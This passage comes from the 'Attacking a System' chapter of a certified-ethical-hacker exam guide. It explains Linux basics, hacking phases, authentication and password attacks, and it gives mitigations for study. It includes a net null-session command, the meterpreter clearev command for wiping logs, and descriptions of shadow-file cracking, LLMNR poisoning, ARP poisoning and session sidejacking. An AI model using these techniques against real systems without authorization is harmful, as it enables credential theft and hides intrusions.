really important information and services on Linux servers, so if you see one, it’s probably
a gold mine. When it comes to your exam, you won’t see many Linux questions at

05-ch05.indd 198 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

199

all—ECC seems much more “Windows focused” of late. Additionally, you won’t neces-
sarily see questions specifically addressing Linux architecture; however, if you are familiar
with Linux architecture, it will help out greatly in figuring out what some questions are
actually looking for.

Any discussion on an OS has to start with the basics, and you can’t get more basic
than the file system. The Linux file system isn’t that far removed from the NTFS layout
you’re already familiar with in Windows—it’s just a little different. Linux starts with a
root directory just as Windows does. The Windows root is (usually) C:\. The Linux root
is just a slash (/). It also has folders holding specific information for specific purposes, just
like Windows. The basic file structure for Linux is shown in Figure 5-3.

NOTE Your nerd actoid or today comes courtesy o our tech editor. Do you
know the origins o the Windows standard root designator? Originally drives
were numbered, and then swapped to letters when Microsot got involved.
Because most early systems had no internal drive, they booted rom the
irst loppy drive (A:) and used a secondary drive (B:) or other things. When
the hard drive became cost eicient enough to put into systems, it largely
eliminated, over time, the need or the loppy drives. But the designator
stuck, and C:\ still is the deault. Additionally, to this day Windows still limits
you to 26 drives (a–z) and reuses to boot a hard drive mounted to a: or b:.

(Root folder)

/bin  /dev  /etc /home  /mnt /sbin  /usr

Optical drive  USB

Hard
/etc/passwd /etc/shadow drive

(password file) (encrypted
passwords)

/home/user 1  /home/user 2

Figure 5-3 Linux ile structure

05-ch05.indd 199 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

200

Here’s a list of the important folders you’ll need to know:

• / A forward slash represents the root directory.
• /bin The bin directory holds numerous basic Linux commands (a lot like the

C:\Windows\System32 folder in Windows).
• /dev This folder contains the pointer locations to the various storage and

input/output systems you will need to mount if you want to use them, such as
optical drives and additional hard drives or partitions. Note that everything in
Linux is a file.

• /etc The etc folder contains all the administration files and passwords. Both the
password and shadow files are found here.

• /home This folder holds the user home directories.
• /mnt This folder holds the access locations you’ve actually mounted.
• /sbin Another folder of great importance, the system binaries folder holds

more administrative commands and is the repository for most of the system/
background routines Linux runs (known as daemons).

• /usr Amazingly enough, the usr folder holds almost all of the information,
commands, and files unique to the users.

When you log into the command line in a Linux environment, you start in your
assigned directory and can move around simply by using the cd (change directory) com-
mand. You’ll need to, of course, define the path you want to use, so it’s important to
know where you are. Many terminal sessions display the path just to the left; however, if
you’re unsure, type pwd to see where you are and navigate from there. You can find other
basic Linux commands of note in Table 5-1.

EXAM TIP Adding an ampersand (&) ater a process name indicates that the
process should run in the background. I you want the process to remain
ater user logout (that is, stay persistent), use the nohup command.

Security on Linux files and folders is managed through your user account, your
user’s group membership, and three security options that can be assigned to each for
any resource: read, write, and execute. These security rights can be assigned only by the
owner of the object. Typing the command ls -l displays the current security settings for
the contents of the directory you’re in, which appears like this:

drwxr-xr-x 2 user1 users 33654 Feb 18 10:23 direc1
-rw-r--r-- 1 user1 users 4108 Feb 17 09:14 file1

The first column displays what the object is (the letter d indicates a folder, and blank
indicates a file) along with the assigned permissions, which are listed as rwxrwxrwx. The
read, write, and execute options are displayed for user, group, and all others, respectively.

05-ch05.indd 200 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

201

Command  Description

adduser Adds a user to the system.

cat Displays the contents o a ile.

cp Copies.

ifconfig Much like ipconig in Windows, displays network coniguration inormation about
your NIC.

kill Kills a running process. (You must speciy the process ID number.)

ls Displays the contents o a older. The -l option provides the most inormation
about the older contents.

man Displays the “manual” page or a command (much like a help ile).

passwd Enables you to change your password.

ps Process status command. The -e option shows all processes running on the system.

rm Removes iles. The command rm -r also recursively removes all directories and
subdirectories on the path and provides no warning when deleting a write-
protected ile.

su Allows you to perorm unctions as another user. The sudo command version
allows you to run programs with “super user” (root) privileges.

Table 5-1 Linux Commands

For example, the file named file1 has read and write assigned for the user, read-only for
the group, and read-only for all others. The owner of the resources is also listed (user1)
along with the assigned group (users).

NOTE While we’re romping through commands and permissions, did you
know there is a subtle but very important distinction between the adduser
and useradd commands in Linux? Check out this link or more details: https://
www.dierencebetween.com/dierence-between-adduser-and-vs-useradd/.

These permissions are assigned via the chmod command and the use of the binary
equivalent for each rwx group: read is equivalent to 4, write is 2, and execute is 1. For
example, the following command would set the permissions for file1 to r--rw-r--:

chmod 464 file1

Giving all permissions to everyone would look like this:

chmod 777 file1

Obviously, knowing how to change permissions on a file or folder is an important little
nugget for an ethical hacker.

Another important Linux fundamental deals with users, groups, and the management
of each. Just as Windows has accounts created for specific purposes and with specific
rights, Linux has built-in accounts for the management of the system. The most impor-
tant of these user accounts is called root and is the administrative control of the system.

05-ch05.indd 201 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

202

All users and groups are organized via a unique user ID (UID) and a group ID (GUID).
Information for both can be found within the /etc/passwd file. Running a cat command
on the file displays lines that look like this:

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:
… ****** removed to save space ******
matt:x:500:500:Matt:/home/mat:/bin/csh
user2:x:501:501:User2:/home/us1:/bin/pop

Among other items in the file, you’ll find the users are listed. Root—the administra-
tive “god” account of the system and the one you’re trying to get to—is listed first, with
its UID and GID set to 0. User matt is the first user created on this system (UID and
GID are set to 500), and user2 is the second (UID and GID set to 501). Immediately
following the user name is the password. Notice, in this case, the password is listed sim-
ply as x, indicating the use of something called the shadow file.

Passwords in Linux can be stored in one of two places. The first you’ve already
met—the passwd file. If this is your chosen password storage location, all passwords
are displayed as a hash—an easily accessible, crackable hash—to anyone who has read
privileges to the file. If you choose to use the shadow file, however, the passwords are
stored and displayed encrypted (that is, hashed and salted). Lastly, and of special note to
you, a budding ethical hacker, the shadow file is accessible only by root.

NOTE Finding a nonshadowed system in the real world is just about
impossible. The passwd ile and the shadow ile are covered here or purely
academic purposes (in other words, you may see them on the test) and not
because you’ll get lucky out on the job. For the most part, every “nix” system
you run into will be shadowed—just so you’re aware.

Just as with Windows, pulling the passwords offline and working on them with a
cracker is your best bet for system “owning.” John the Ripper (colloquially called “John”)
is one tool that works wonderfully well on Linux shadow files. The passwords contained
within are actually hashes that, usually, have a salt assigned (also covered earlier). John
runs through brute-force hashing and tackles the salts for you. But fair warning—you’ll
be in for a wait. With salting, complexity, and sufficient length, John could be banging
away at it for, literally, years. John will get there eventually; it just will take a long while.
One final note: Weirdly enough, John barely gets a passing notice in the official CEH
courseware. You’ll need to know it, of course, but chances are better than not you won’t
even be asked about it.

NOTE More than a ew Linux distributions (aka “distros”) are made explicitly
or hacking. These distros normally have many hacking tools, such as John
and Metasploit versions, built in. Parrot OS and Kali Linux are just a couple
o examples.

This section wasn’t about making you a Linux expert; it was aimed at introducing you
to the bare-bones basics you’ll need to be successful on the exam, as well as for entering

05-ch05.indd 202 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

203

the career field. As with everything else we’ve discussed thus far, practicing with a live sys-
tem is your best option. Download a few distributions and practice—you won’t regret it.

Methodology
I know, I get it, so stop yelling at the book—you’re sick of methodologies, lists, and
steps. Trust me, I’m sick of writing about them. However, they are essential to your exam
and, yes, to your future job as an ethical hacker. You wouldn’t get on a plane if you saw
the mechanics and pilots just toss away their preflight checklist, would you? Just as that
checklist ensures problems are noted and taken care of before you’re 30,000 feet in the
air, all these ridiculous-sounding steps and phases ensure our hacking flight goes off
without a hitch and makes sure we cover everything that needs to be looked at. You may
not like them, but if you’re concerned about giving your customer—you know, the one
paying you to pen test their organization and the one putting their full faith and trust
in you—what they need out of a pen test, you’d better get familiar with using them.
ECC’s “System Hacking Goals” include Gaining Access, Escalating Privileges, Executing
Applications, Hiding Files, and Covering Tracks. While most questions on these steps
are pretty straightforward, just commit the list to memory and use best judgment on
anything truly weird.

EXAM TIP Another term you’ll see bandied about, both here on your exam
and in the real world, is the concept o pivoting. The idea is airly simple: ind
a way to gain access and privilege escalation/control over an internal box,
then use that box to launch attack and control eorts inside/behind the
irewall. You know, pivot o it.

Remember the ethical hacking phases described in Chapter 1? I’ve already walked you
through the first phase (reconnaissance, aka footprinting) and spent a lot of time in the
next (scanning and enumeration), so now it’s time to get into the meat of the list. Gain-
ing access is the next phase in the methodology and the next warm bath of terminology
and memorization we’re slipping into. Maintaining access and covering tracks are the
remaining steps, which we’ll get to in this chapter and throughout the remainder of the
book. If you were to examine these remaining phases, EC-Council has broken them
down even further for your amusement, enjoyment, and edification.

NOTE In case you haven’t noticed, and that would be hard given I’ve said it
roughly a million times already, reality and what’s tested on the CEH exam
otentimes don’t match up. Amazingly enough, people who are new to
the career ield tend to do better on the exam than those who have been
in it or several years. That’s probably because the grizzled veterans keep
trying to introduce the real world into the equation, whereas entry-level
olks just memorize this inormation and move on. A system attack brings a
whole host o possibilities to mind or someone actually doing this job, and
reducing it to password attacks and privilege escalation just doesn’t seem
to make sense. I you’re going to pass this exam, however, you’ll need to just
accept some things as they are, so study and memorize accordingly.

05-ch05.indd 203 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

204

In the gaining access phase, we’re supposed to take all that ammunition we gath-
ered in the previous steps and start blasting the target. In EC-Council’s view of the
world, that means cracking passwords and escalating privileges. Sure, there are tons of
other attacks that can and should be hurled at a machine (many of which we’ll cover
later in this book), but in this particular phase, CEH concentrates on getting those
pesky passwords figured out and escalating privilege once you do. So, don’t freak out
if you’re flipping through this chapter thinking I’m ignoring all other access attacks;
I’m just following EC-Council’s structure and view of the hacking world to help you
in your study.

After privilege escalation, you leave the gaining access phase and move into maintain-
ing access. Here, the objective is to set up some things to ensure you can come back to
this target and play around later, and in ECC’s way of thinking that means executing
applications and hiding files. The idea is to execute a few applications that provide long-
term access (which of course bleeds you right into the maintaining access phase). Of
course, doing all this leaves a horrible mess laying around for anyone paying attention to
notice and use to catch you in the act. This then leads you nicely into the last phase—
covering tracks.

This covering tracks phase is exactly what it sounds like: we’ve busted in, gotten con-
trol, and set up a way back in for later access, but now it’s time to clean up the mess so
the owner doesn’t notice anything amiss. If we were breaking into a bank or a business,
we’d probably sweep up all the glass (if we broke anything) and wipe down fingerprints
from anything we touched. System hacking is no different. Cleaning up and wiping
down simply means we take care of log files on the machine and do our best to cover
our tracks.

EXAM TIP A couple o random track-covering/hiding notes or your
amusement and study include clearing logs rom the meterpreter (launch a
meterpreter shell in Metasploit, type clearev on the command line, and logs
o target start wiping), clear the Most Recently Used (MRU) list in Windows
(you can use registry key HKEY_LOCAL_MACHINE\SOFTWARE\MICROFOT\
WINDOWS\CURRENTVERSION\EXPLORER or recent docs, and go through
personalization settings to clear elsewhere), and appending a dot (.) in ront
o iles in Unix to hide them.

So, there you have it, wrapped up in a neat little bundle and illustrated (hopefully
clearly) in Figure 5-4. I know some of you are scratching your heads trying to figure out
why I added hiding files to the maintaining access phase, when it seems to any rational
person to belong in the covering tracks phase, but I have good reason for doing so: that’s
how it’s covered in the official courseware and class. So don’t blame me. And once we
know what we’re supposed to do, we’re ready to dive into how to do it. But first, we still
have a little background knowledge to cover: one, because it’s testable, and two, because
you really need to know this before moving forward.

05-ch05.indd 204 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

205

Figure 5-4 Reconnaissance Reconnaissance
System attack
phases

Discovery and Port Scanning
Scanning

Enumeration

Cracking Passwords
Gaining Access

Escalating Privileges

Executing Applications
Maintaining Access

Hiding Files

Covering Tracks Clearing Logs

Dreams: The Parrot OS Story
Did anyone ever ask you when you were very young, “What do you want to be
when you grow up?” If you’re anything like me, you heard that a lot and your cur-
rent position isn’t exactly what you had in mind when you were seven. Like many
other kids, I had dreams of flying planes, joining the police, putting out fires, and
jumping out of helicopters. Unlike most kids my age, I also wanted to be Governor
of the great State of Alabama (one trip to the State capital to see that dome and
walk through the congressional seating arena was enough for me). And, unlike most
other kids, Lorenzo Faletra had different ideas.

From the small town of Palinuro, Italy, Lorenzo was fascinated with computer
systems and how they communicated. By the age of 14 he had already grabbed his
copy of Backtrack and learned the ins and outs—by his own admission at a “script
kiddie” level at least—of the distro, playing around to customize the environment.
One thing that did bug him, though, was the waste of time reconfiguring the envi-
ronment every time he changed systems. Which gave him an idea: “Hey, why not
make my own Linux distro?”

Flash forward to 2021, and Parrot OS (https://www.parrotsec.org/) is one of the
fastest growing, best reviewed security distributions worldwide. And, if you didn’t
know already, it is the preferred security distribution used by EC-Council for the
CEH exam. From the project website:

Parrot is a worldwide community of developers and security specialists that
work together to build a shared framework of tools to make their job easier,
standardized and more reliable and secure. Parrot OS…is a GNU/Linux dis-
tribution based on Debian and designed with Security and Privacy in mind.
It includes a full portable laboratory for all kinds of cyber security operations,
from pentesting to digital forensics and reverse engineering, but it also includes
everything needed to develop your own software or keep your data secure.

(continued )

05-ch05.indd 205 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

206

As with other Linux distros, Parrot is free to download, install, and play with, and
was designed to be so. Again from the project website, “Feel free to get the system,
share with anyone, read the source code and change it as you want! This system is
made to respect your freedom, and it ever will be.” Parrot includes a full suite of tools
you’d want for most pen test scenarios, is ridiculously easy to use, and is laid out nicely,
with a very intuitive, easy-to-use GUI. And, as an added bonus, Parrot was designed
with resource usage in mind: “the system has proven to be extremely lightweight and
run surprisingly fast even on very old hardware or with very limited resources.”

And the Parrot project isn’t done—they’re just getting started. The follow-
ing is an excerpt from an interview with Lorenzo in October 2020 (https://
thesecuritynoob.com/interviews/about-parrot-os-and-interview-with-its-founder-
lorenzo-palinuro-faletra/):

GNU/Linux distributions flooded with old Pentest tools are something of the
past; they are still useful tools, but I don’t see them as the main characters of
the arsenal of the future Pentester (long-term wise), so my plan now is to find
a way to blend the project in the proper direction and follow the trend (or
maybe create it?). What I would like to avoid is to be blind to the new trends
and find myself obsolete in [a] few years without even noticing. At the very
moment I’m working hard on sandboxing and containerization technologies,
and we are experimenting with [D]ocker, [F]irejail and other tools to find a
way to combine them in our distro to ship the level of security and flexibility
that we expect will be the main driver of the future of our sector.

So does this mean Parrot will simply overtake other distros, including the ubiqui-
tous and extremely well-known Kali? It’s obviously way too early to tell and, thank-
fully, probably not ever truly going to be the case for any single distro. I believe the
true impact of players like Parrot on the security scene will be to encourage and spur
new development in the security sector, making life better for all of us. And in the
meantime, Parrot provides another solid player in the pen test and security distribu-
tion world for everyone—especially CEH candidates—to know and love.

For your humble author’s opinion, I can personally recommend you download,
install, and play with this distro. It, thus far, lives up to everything I’ve seen written
about it, and I’m looking forward to seeing it grow and expand in the future. At
least, that’s the dream…

Hacking Steps
The gaining access phase, by its own definition, requires you to grab authentication
credentials of some sort to gain access to the device. Since a password associated with
a user name marks the most prevalent authentication measure, it follows that password
attacks should take up the majority of our time here. Sure, there are other ways to affect
the changes and gather the information you’ll want on a pen test, but we’re trying to

05-ch05.indd 206 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

207

stick with the methodology here, and, actually, it kind of makes sense. To put everything
together in some sort of logical order, we’ll first cover some basics regarding the lowly
password itself and then discuss some of the attacks we can carry out against it.

Authentication and Passwords
Proving your identity for access to something has been around since ancient times—a
letter delivered by a man on horseback meant nothing unless the rider carried the seal of
the king, for example. The virtual world is no different, and the same issues that apply
in the physical world raise their collective heads in this one as well. How do we make
sure the person in front of us asking for access is exactly who they say they are? What
can we use as definitive proof? Do we require more than one sample of proof, just to be
super-sure? This section is all about authentication, and the most common form of it in
the virtual world—passwords.

Authentication
Authentication has always revolved around three factors for the individual: something
you are, something you have, and something you know. The something you are measure
regards using biometrics to validate identity and grant access. Biometric measures can
include fingerprints, face scanning, voice recognition, iris scanning, and retina scanning.
While biometrics seems like a panacea for authentication efforts, there are issues in dealing
with it. The great thing about using biometrics to control access is that faking a biometric
signature (such as a fingerprint) is difficult. The bad side, though, is a related concept:
because the nature of biometrics is so specific, the system may easily read an attempt as a
false negative and deny legitimate access.

EXAM TIP I you use a single authentication type—or example, just
something you know (such as a password)—it’s reerred to as one-actor
authentication. Add another type—say, or example, a token (something you
have)—with the password, and now you have two-actor authentication. All
three together? You guessed it—three-actor authentication (also known as
multiactor authentication, MFA).

Most biometric systems are measured by two main factors. The first, false rejection rate
(FRR), is the percentage of time a biometric reader denies access to a legitimate user. The
second, false acceptance rate (FAR), is the percentage of unauthorized access given by the
system. The two measurements are charted together, and where they intersect is known
as the crossover error rate (CER), which becomes a ranking measurement of biometric
systems (the lower the CER, the better the system).

NOTE Believe it or not, biometrics can also be measured by active versus
passive and by its invasiveness. Active means you’ve gotta touch it. Passive
means you don’t. Invasiveness seems to be largely a subjective measure.
For example, supposedly a retina scan—requiring active participation—is
more invasive than an iris scan, which is considered passive in nature.

05-ch05.indd 207 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

208

The something you have authentication measure consists of a token of some sort (like
a swipe badge or an ATM card) for authentication. Usually this also requires the user to
use a PIN or password alongside it (making it two-factor authentication), but there are
tokens that act on their own as a plug-and-play authentication measure. This comes with
serious risks (if someone steals your token, they can access your resources), which is why
a token is almost always used with something else.

EXAM TIP Ever heard o a biometric passport? Also known as an e-passport,
it’s a token you carry with you that holds biometric inormation identiying
you. Even though it sounds like a two-actor measure, because it’s a single
token, its use is considered just something you have.

Most security comes down to something you know, and that something is a password.
A password’s strength is usually determined by two major functions: length and com-
plexity. There’s an argument to be made whether either one is better than the other, but
there’s no argument (at least insofar as EC-Council and your exam are concerned) that
both together—in one long and complex password—is the best. Password types basi-
cally are defined by what’s in them and can be made up of letters, numbers, special
characters, or some combination of all. Passwords containing all numbers (for example,
12345678) or all letters (for example, AbcdEFGH) are less secure than those contain-
ing a combination of letters and numbers (for example, 1234AbcD). If you put all three
together (for example, C3h!sgr8), you have the best you can get.

Complexity aside, the length of the password is perhaps even more important. With-
out a long, overly complicated discussion, let’s just apply a little deductive reasoning here.
If a password cracker application has to guess only four characters, it’s going to take expo-
nentially less time than trying to guess five, six, or seven characters. Assuming you use
nothing but alphabetic characters, upper- and lowercase, every character you add to the
password raises the possible combinations by an exponent of 52. Therefore, the longer
your password and the more possible variables you have for each character in it, the longer
a password-cracking application (or, in modern systems, a distributed system of machines
cracking passwords) will take to decipher your password, and the more secure you’ll be.

When it comes to passwords, just remember there’s no real magic solution in securing
your resources. If passwords are overly long and complex, users will forget them, write
them down carelessly, and open themselves up to social engineering attacks on resets. If
passwords are too simple, password crackers can have a field day in your environment.
The best you can do is stick with the tips provided here and try to walk that line between
security and usability as best you can.

NOTE Want another great password tip? Watch out or “keyboard walks”
in password creation. A user who simply walks the keyboard (typing in
straight lines up or down the keyboard) could wind up with a long, complex
password in keeping with all policies but would be creating one every
cracker will have in their password list. lo0MKI9njU* may look like a good
password, but walk it out on the keyboard and you’ll see why it’s not.

05-ch05.indd 208 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

209

Lastly, another exceedingly important point involving passwords that is often over-
looked by security professionals is the existence of default passwords. Default passwords
are put in place by the manufacturer to allow the installing administrator to initially
log in and set up the device or service, and these are sometimes simply forgotten about
after installation. Routers, switches, wireless access points, database engines, and soft-
ware packages all come installed with default passwords, and any hacker worth her salt
will try at least a few iterations as an easy way in. Search engines are very helpful in
this regard—just search for “default password lists” and you’ll see what I mean. A few
resources to get you going include https://cirt.net, https://default-password.info, and
https://open-sez.me.

Password Attacks
ECC defines four main attack types for password cracking: non-electronic, active online,
passive online, and offline.

Non-Electronic Attacks The non-electronic attack is so powerful and so productive I’ve
devoted an entire chapter to it (Chapter 12). Social engineering takes on many different
forms and is by far the best hacking method ever devised by humankind. When you’re
trying to crack passwords, the absolute best way to get one is simply to ask the user for it.
Phrased the right way, when the user believes you to be someone from the IT department
or a security agent, asking users flat out for their passwords will work more often than
you’d think. Other productive methods include shoulder surfing (looking over the user’s
shoulder—or from across the room or around the corner—to watch the keystrokes) and
dumpster diving (combing through waste baskets and dumpsters for written passwords).
We’ll cover much more on social engineering later—just stay tuned.

EXAM TIP Another term I’ve seen bandied about in study is a “rule-
based attack.” It’s more or less a dictionary/brute-orce attack with better
inormation. For example, i Pen Tester Joe knows nothing about your
passwords, he has to test everything. I he knows in advance, though, your
password lengths are between 8 and 12 characters, you don’t allow them to
start with numbers, and you only allow certain special characters, then he
can greatly speed up his eorts.

Active Online Attacks The active online attack is carried out by directly communi-
cating with the victim’s machine and might possibly be the worst of the group from
a terminology memorization aspect. Per ECC, active online attacks include dictionary
and brute-force attacks, hash injections, phishing, Trojans, spyware, keyloggers, and
password guessing. Many of these are easy enough to figure out. For example, a hash
injection attack occurs when you steal a hash and inject it into a local session in hopes
of accessing something. Password guessing is exactly what it sounds like—the attacker
begins simply trying passwords—and Trojans or spyware can be installed on the system
to steal passwords. It’s keyloggers and phishing here that make us all want to bang our
virtual heads against the wall.

05-ch05.indd 209 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

210

Keylogging is the process of using a hardware device or software application to
capture the keystrokes a user types. With this method, it really doesn’t matter what
authentication method you’re using or whether you’re salting a hash; the keystrokes are
captured as they are typed, regardless of what they’re being typed for. If implemented
correctly, keylogging works with 100 percent accuracy, is relatively easy to do, and
requires almost no technical knowledge at all.

Keyloggers can be hardware devices—usually small devices connected between the
keyboard cable and the computer—or software applications installed and running in
the background. In either case, keyloggers are an exceptionally powerful and productive
method for scoring big hits on your target. Most users have no means to even realize a
software application is running in the background, and most people rarely, if ever, look
behind their computers to check for a hardware device. When was the last time you
checked yours?

EXAM TIP Sotware keyloggers are easier to spot with antivirus and other
scanning options than hardware keyloggers, which according to oicial
courseware are almost impossible to detect. This is not to say sotware
keyloggers are easy to spot. To the contrary, they might exist purely in
memory, within a hypervisor, or within the host kernel, and a sophisticated
attacker may have novel and unique methods that are not signatured.

So how does a hardware keylogger constitute an active online attack? I suppose the
theory is you are directly interacting with the device by manually attaching something to
it. I know it’s a stretch but, hey, I never said any of the exam side was reality, did I? And
if you think that’s bad, consider they include phishing in this as well.

Phishing is a social engineering attack whereby the attacker crafts an e-mail—usually
with a bogus link for the user to click—and sends it to folks inside the target organization.
What does this have to do with password cracking? I can honestly say, I’m not very sure,
but ECC says it belongs here, so note it for your exam. We’ll cover more about phishing
later on.

Another active online attack called out specifically by EC-Council is the LLMNR/
NBT-NS (Link-Local Multicast Name Resolution and NetBIOS Name Service) attack.
This one is yet another example of a good idea designed to make our online lives easier
being hijacked and used for devious purposes. The original idea was simple: we should
keep name resolution as local as possible and/or provide a backup means for when DNS
fails; therefore, DNS could use some help inside the subnet. Microsoft thought this was
a great idea and came up with a couple Windows components that would act as alternate
methods of host identification locally: LLMNR is based on the DNS format and allows
hosts on the same subnet/local link to perform name resolution for other hosts, while
NBT-NS identifies systems on a local network by their NetBIOS name.

How can this Windows feature be leveraged, and what does it have to do with a pass-
word attack? Let’s say a bad guy has the means to get on your subnet and he spoofs the
authoritative source for name resolution by simply responding to LLMNR or NBT-NS
traffic. For example, suppose System A sends a broadcast asking if anyone knows the

05-ch05.indd 210 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

211

resolution for a particular resource on BRADFLSVR1. The attacker send a response say-
ing, “Hey, yeah…that’s me. Just send all your traffic intended for BRADFLSVR1 this
way.” This effectively poisons System A’s service, and now all traffic flows to the attack-
er’s system. If the request requires identification and authentication, the user name and
NTLMv2 hash may then be sent to the attacker’s system, which could then be collected
through sniffers and other tools. After collection, the bad guy takes the hashes offline and
starts cracking.

The best tool I’m aware of for pulling this off is the LLMNR/NBT-NS spoofing tool
Responder (https://github.com/lgandx/Responder). If you’re interested, mitigations for
this attack include disabling LLMNR and NetBIOS (in local computer security settings
or via Group Policy) if they are not needed in your environment, and using host-based
security software to block LLMNR and NetBIOS traffic. This attack may or may not be
tested on your exam, but it warrants an explanation here to cover all bases. Figure 5-5 lays
out the whole attack for you.

EXAM TIP Need additional ino on LLMNR and NBT-NS? Glad you asked.
LLMNR uses UDP 5355 and NBT-NS uses UDP 137, by deault. LLMNR
makes use o a link-scope multicast IP address (224.0.0.252 or IPv4 and
FF02:0:0:0:0:0:1:3 or IPv6). Lastly, you can monitor or this attack in your
environment by checking HKLM\Sotware\Policies\Microsot\Windows NT\
DNSClient or changes to the “EnableMulticast” DWORD value (“0” indicates
LLMNR is disabled), or by watching port traic (5355 and 137).

Active online attacks oftentimes take much longer than passive attacks and also tend
to be much easier to detect. If you happen to have identified a dinosaur Windows NT
or 2000 machine on your target network, you can bang away at the IPC$ share and

DNS server

3. <Broadcast> Anyone here
know where BRADFLSVR1 is?

1. Who is BRADFLSVR1?

2. I can’t find that name.

4. Sure. That’s me.

5. GREAT! I’d like to log in.

6. No problem. Here’s a challenge. Answer
with your password hash.

7. Here’s your challenge response + hash.

8. Something went wrong. Try again later.
(And thanks.) ;)

Figure 5-5 LLMNR attack

05-ch05.indd 211 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

212

guess all you want. If you’re facing Windows XP and Windows 7 machines, the old
“administrator” C$ share is still usually valid and, as always, you can’t lock out the true
administrator account. You can try any variety of scripts available to run through user
names and passwords against this share; just keep in mind it’s noisy and you’re bound to
get noticed. Decent network and systems administrators change the local administrator
account’s name to something else (such as admin, sysadmin, or admin1), so don’t be
surprised if you wind up locking out a few accounts while trying to get to the real one.

NOTE Windows password recovery (or reset) tools include chntpw
(Linux utility available in several distributions), ISeePassword (https://
www.iseepassword.com), Windows Password Recovery (https://www
.windowspasswordrecovery.com), Passware Kit (https://www.passware.com),
and PCUnlocker (https://www.pcunlocker.com).

And don’t forget the old “net” commands. Here are a few to remember from your
enumeration time:

• net view /domain:domainname Shows all systems in the domain name provided
• net view \\systemname Provides a list of open shares on the system named
• net use \\target\ipc$ "" /u: " Sets up a null session

EXAM TIP There are a couple o special switches with the net commands.
Just typing net use shows your list o connected shared resources. Typing
net use Z: \\somename\fileshare mounts the older fileshare on the remote
machine somename. I you add a /persistent:yes switch to it, the mount
stays ater a reboot. Change the switch to no and it won’t.

Passive Online Attacks A passive online attack basically amounts to sniffing a wire in
the hopes of either intercepting a password in clear text or attempting a replay attack
or a man-in-the-middle (MITM) attack. If a password is sent in clear text, such as in a
Telnet session, the point is obvious. If it is sent hashed or encrypted, you can compare
the value to a dictionary list or try a password cracker on the captured value. During the
MITM attack, the hacker attempts to resend the authentication request to the server for
the client, effectively routing all traffic through the attacker’s machine. In a replay attack,
however, the entire authentication process is captured and replayed at a later time—the
client isn’t even part of the session.

Some passive online password hacking you’ve already done—just check the sniffing
discussion in Chapter 4. You can do other types of passive online password hacking
by using specifically designed tools, such as the old-time favorite Cain and Abel (a
Windows-based sniffer/password cracker). Turn Cain on while you’re surfing around
for a day and I bet you’ll be surprised what it picks up. You can even set up Cain to sniff
network traffic and then leave it alone: come back the next day and all the clear-text
passwords, along with any hashes, will be stolen and ready for you.

05-ch05.indd 212 14/09/21 3:57 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

213

And if you really want to see what a specific machine may be sending password-wise
over the wire, try ARP poisoning with Cain (the button that looks like a radiation warn-
ing). The machine—or all of the machines if you spoof the default gateway MAC—will
gladly send you everything! You can then use Cain for some offline brute-force or dic-
tionary attacks on the password hashes you can’t read.

Basically, you monitor the victim’s traffic using a sniffer and packet-capture tool (Fer-
ret), and a file called Hamster.txt is created. After the victim has logged into a site
or two, you fire up Hamster as a proxy, and the cookies and authentication streams
from the captured TXT file will be displayed. You simply click through them until one
works—it’s that easy (of course, both machines must be on the same subnet). Installation
of the tools can be a bit tricky, so be sure to check the help pages on the download site.

A surprising majority of sites use this method of session identification and are just
as easily “hacked.” For those that don’t, a combination of URL variables, HTTP GETs,
and other things will frustrate your efforts and cause you to try other methods—if this
is, indeed, your goal. In practice, getting the session IDs from a website through XSS or
other means can be tricky (Internet Explorer, for example, has done a really good job of
locking down access to session cookies), but I believe this validates these discussions on
physical security. If an attacker has uninterrupted physical access to the machine, it’s
only a matter of time before the system is hacked, regardless of what security measures
may already be in place. Internet Explorer plays with cookies differently, so there’s some
trickiness involved, but this is an easy way to sidejack.

Another tool of note is Ettercap, which we’ve mentioned in previous chapters. As
with Cain, you can ARP poison and sniff with Ettercap and steal just about anything
the machine sends out. Ettercap can also help against pesky SSL encryption (which pre-
vents an easy password sniff ). Because Ettercap is customizable, you can set it up as an
SSL proxy and simply park between your target and any SSL site the victim is trying to
visit. I watched this happen on my own banking account in our lab where we worked.
My co-worker simply put himself (virtually) between my system and the SSL site, stole
